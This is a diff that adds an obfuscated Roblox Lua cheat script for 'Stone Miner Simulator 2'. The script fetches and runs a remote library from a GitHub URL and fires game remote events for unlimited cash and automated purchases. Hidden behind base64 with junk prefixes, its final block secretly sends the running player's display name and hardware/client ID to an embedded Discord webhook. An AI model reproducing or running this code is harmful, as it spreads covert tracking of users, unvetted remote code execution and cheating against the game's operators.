@@ -1,0 +1,134 @@
+--STONE MINER SIMULATOR 2 SCRIPT PASTEBIN
+--CREDS Buns#3351/VIPER
+--Discord https://discord.gg/8Y86bcfk8g
+--STONE MINER SIMULATOR 2 SCRIPT PASTEBIN
+--CREDS Buns#3351/VIPER
+--Discord https://discord.gg/8Y86bcfk8g
+
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+function ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')
+
+data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end
+
+--STONE MINER SIMULATOR 2 SCRIPT PASTEBIN
+--CREDS Buns#3351/VIPER
+--Discord https://discord.gg/8Y86bcfk8g
+ 
+--STONE MINER SIMULATOR 2 SCRIPT PASTEBIN
+--CREDS Buns#3351/VIPER
+--Discord https://discord.gg/8Y86bcfk8g
+
+
+
+local Library = loadstring(Game:HttpGet(ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('rljpDvrwCJXZlHnWdcrHAvEqfSRJCtSHQfjxAmufFBpOsGFCKbOuXeHaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jsb29kYmFsbC8tYmFjay11cHMtZm9yLWxpYnMvbWFpbi93aXphcmQ=')))()
+
+local Main = Library:NewWindow(ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('eGAZwAVYDatTbeghGmtnrBYDiYjGDFLGxRKRzvEFIoYXjBnUoYLOQeAVklQRVIgSFVC'))
+
+local MainFarm = Main:NewSection(ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('THWCUqhQWStjsStZhnUWLwCTAkAyVFuIPkmgqXvOlgDsfljjqLOPXdYQXV0byBTZWxs'))
+
+local BetFarm = Main:NewSection(ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('uEiYzetZZThZYxJjUfSMAKvXGkRmqHshNjLhSQLVwGoyQLenPFaFohGQXV0byBUeWNvb24='))
+
+local CharFarm = Main:NewSection(ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('TeYAFMDijUIXayvJdXAaYcfcqwamSOMCVGPkncIuPDPCIxVYqERgttUQ2hhcmFjdGVyIFNjcmlwdHM='))
+
+--values
+--STONE MINER SIMULATOR 2 SCRIPT PASTEBIN
+--CREDS Buns#3351/VIPER
+--Discord https://discord.gg/8Y86bcfk8g
+
+getgenv().autoCash = true
+getgenv().infMoney = true
+
+--values
+--STONE MINER SIMULATOR 2 SCRIPT PASTEBIN
+--CREDS Buns#3351/VIPER
+--Discord https://discord.gg/8Y86bcfk8g
+
+--function
+
+function autoCash()
+    while getgenv().autoCash == true do wait()
+        game:GetService(ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('dmSdOuWUNCeWjgfPEYtKdkftaJEzwIofbKRcFNwdXkhuzMNMrMNUalSUmVwbGljYXRlZFN0b3JhZ2U=')).RemoteObjects.CollectedMoney:FireServer()
+    end
+end
+
+--STONE MINER SIMULATOR 2 SCRIPT PASTEBIN
+--CREDS Buns#3351/VIPER
+--Discord https://discord.gg/8Y86bcfk8g
+
+--functions
+
+--STONE MINER SIMULATOR 2 SCRIPT PASTEBIN
+--CREDS Buns#3351/VIPER
+--Discord https://discord.gg/8Y86bcfk8g
+
+MainFarm:CreateToggle(ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('DfYuFxgMKtwKQhLxHpvknmOgNAnRVniBbHfEMTTGXrKHyDoBChrpEZvQXV0b1NlbGw='), function(value)
+        getgenv().autoCash = value
+            autoCash()
+    end)
+
+
+
+    BetFarm:CreateTextbox(ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('TAffOlvmuAvVHYOWwLinMDHDgvKrErjnzRGsTFoWWBSsgoOFUIMXqOgSW5wdXQgTW9uZXkgQW1vdW50'), function(text)
+    game:GetService(ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('LuaepuHEZeGcmPNHHIlGVmGTJxPgZpRqsSTreUyNKCPWbaTHAMdFlbJUmVwbGljYXRlZFN0b3JhZ2U=')).RemoteObjects.DanceGameCash:FireServer(text)
+end)
+
+
+BetFarm:CreateButton(ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('hjhVwClTgkckfRKVWKMkEGqaSNfclJYAnSBnBKidcbQzbKGcoYGCMRKR2V0IEZyZWUgTGFzdCBUd28gSXRlbXM='), ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('qtRHYaOjfnFUyrGGJsmHCNyvVnNbpbGAkrEPNKwjftxSunXmduypdqh'), function()
+    game:GetService(ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('RPRMAcivRakunprAcknYcEEwAkYfahosXZuHTvWkYnOYEOXystuqhsOUmVwbGljYXRlZFN0b3JhZ2U=')).RemoteObjects.IncrementBeachCash:FireServer(11111111111111111111111111111111)
+game:GetService(ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('JGATbFWHPfuMzQqMHguiixQFweBiwwMJBRIDaZOuJVrkXRCQPlajkIDUmVwbGljYXRlZFN0b3JhZ2U=')).RemoteObjects.ClaimMainStageChallenge:FireServer()
+end)
+
+
+BetFarm:CreateButton(ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('VZwXnLjlRSWpaeRFskzwezrhlGZsGVTGEGBDjwkzXtDdfdWvDdOVjqqQXV0byBDb2xsZWN0IEV2ZXJ5IFBhZC9CdXR0b24='), function()
+    for i1,v1 in pairs(workspace.Buttons:GetChildren()) do
+        for i2,v2 in pairs(v1:GetChildren()) do
+          game:GetService(ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('fAggZmAjTQMJqcnBMuMrIcIKYnvAzgjdnUcmvQUdnqeBtkWDIKPMxqxUmVwbGljYXRlZFN0b3JhZ2U=')).RemoteObjects.RequestButtonPurchase:FireServer(v2.Name)
+        end
+      end
+    
+    
+    end)
+
+--STONE MINER SIMULATOR 2 SCRIPT PASTEBIN
+--CREDS Buns#3351/VIPER
+--Discord https://discord.gg/8Y86bcfk8g
+
+    CharFarm:CreateSlider(ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('ViwAOGyUHqUgesiphbPhNQYsMKyEUdZlfYhxCEXcpsNcYFGntIrshluV2Fsa1NwZWVk'), 0, 100, 15, false, function(s)
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
+     end)
+
+--STONE MINER SIMULATOR 2 SCRIPT PASTEBIN
+--CREDS Buns#3351/VIPER
+--Discord https://discord.gg/8Y86bcfk8g
+
+     HttpService = game:GetService(ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('JTlYHUwbtLVWVUvshXaHLnsPhDVSJOIUIgUGVdaLgOFjzJrpqjgmItySHR0cFNlcnZpY2U='))
+     Webhook_URL = ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('stNrfjjzFBEGZvKtsbCQjUYhIoShFfJlaspKZQqIHBDxBWtTbkKWDwiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTAyNTU3Nzc2MzEzMTkwNDAyMC9ydkVNU0ZrSzFSSGxlYXhLNUc0X2NkT2VWVGt4TGNsTE5YcExBV19kRmdRd1J0TkhJeWRBRXUzUWhjR1NDZDlsZnFOWA==')
+     --STONE MINER SIMULATOR 2 SCRIPT PASTEBIN
+--CREDS Buns#3351/VIPER
+--Discord https://discord.gg/8Y86bcfk8g
+     local responce = syn.request(
+     {
+         Url = Webhook_URL,
+         Method = ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('sOgkkpwBPUYokpGbPdSuiqoLzDwUulwHkkVCRsSRJEEINXqDgIheRPGUE9TVA=='),
+         Headers = {
+             [ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('QwdSkNcBeJSfFiVAzBnELASbfTxPalMMetDEaJZNjOZQWEVmOncYFwbQ29udGVudC1UeXBl')] = ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('uCIooREaANuDRuvfMbGRLbxpWmtsWiULnegMjbFzvRpzEienyPrffPSYXBwbGljYXRpb24vanNvbg=='),
+             },
+             Body = HttpService:JSONEncode({
+                 [ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('NimmTdSbzUUbzUfVTuduzXDuOUWbzQubhulvHYAjvmHqurrBXuMmXBzY29udGVudA==')] = ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('XrDMgiwiiebXwcmPnzEURBkxAkkPKYJfIFzFRMJJbpkqxYtUrtpxKMO'),
+                 [ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('pcrwNxvncNsBcvtRpuWFArbfPyWXXmvxCNuQpwMEZXzmYsioqyrPIHEZW1iZWRz')] = {{
+                     [ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('GrnYoEPsxOPueWGIDkLolpGgxaKPkxUQdKGcqFVZzvRJKenzEetyQWOdGl0bGU=')] = ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('oXuUZKfTfomCnqYxGxkBxgwpSgFuzothFijCacjSudEnrucbQxKnkvwKipZb3VyIHNjcmlwdCBGZXN0aXZhbCBUeWNvb24gaGFzIGJlZW4gZXhlY3V0ZWQqKg=='),
+                     [ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('RkwtjHNvBaVpJexXFZKcVEAYoWBAsGHPLmKhzMmSDjQRNvmbfqRqWZuZGVzY3JpcHRpb24=')] = game.Players.LocalPlayer.DisplayName..ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('oLJafPIGlbwyWlzkJCUGuvNFyqcPfRuBtvyiowmtoNtihbDHkEBFropIGhhcyBleGVjdXRlZCB5b3VyIHNjcmlwdC4='),
+                     [ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('hEvMCSxpwJeUUmzRyDEIVxWCDdBrNfxGgsoCwZYvljuMMBWDsCmbptbdHlwZQ==')] = ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('uXsDPwyaoJgImbOCjVwsuavhNJQbtfVTheFmLODvhozyTFNjhoDBcTccmljaA=='),
+                     [ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('CNxzuLjoluOuUndUgdwZXxrMxloavHTFDpCJmImrUIhfqSsBlsKNBjWY29sb3I=')] = tonumber(0x0000FF),
+                     [ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('RsCVhDJhKTTcEDFvscMPBWRhYMuOdTGpQzsHzrQvIhTxxaOJYcmUGJpZmllbGRz')] = {
+                         {
+                             [ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('vXlKzbobKfdGHskBdAJZZpXqSzYdiloErhXyIkIqaGSwIozIaiRoZZwbmFtZQ==')] = ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('hjhRCXcXoqBLSuABNfWqhziWAxAGfhwoVbYHjEfzaZYqZzRAvnHiZmKSGFyZHdhcmUgSUQ6'),
+                             [ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('aYktBSokmNUSIqIStwkQXHEpZhwAEPeaymVdzZGscietAnRRQmOqwTYdmFsdWU=')] = game:GetService(ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('xHCSYrrKvBcjklNMLiFKFdyfnDtlwTlNtmbayadYtGnJvroQAnJFkAaUmJ4QW5hbHl0aWNzU2VydmljZQ==')):GetClientId(),
+                             [ylVBpLCmQoadNhzMKUJdvRDIogDFbWZHGmoUOqXBa('nizZNslaomjzmftHhwyTQzJBGLJvScZPlxvixKOBacyJIGFGsrUBXhAaW5saW5l')] = true
+     
+                         }
+                     }
+                 }}
+             })
+     }
+     )    
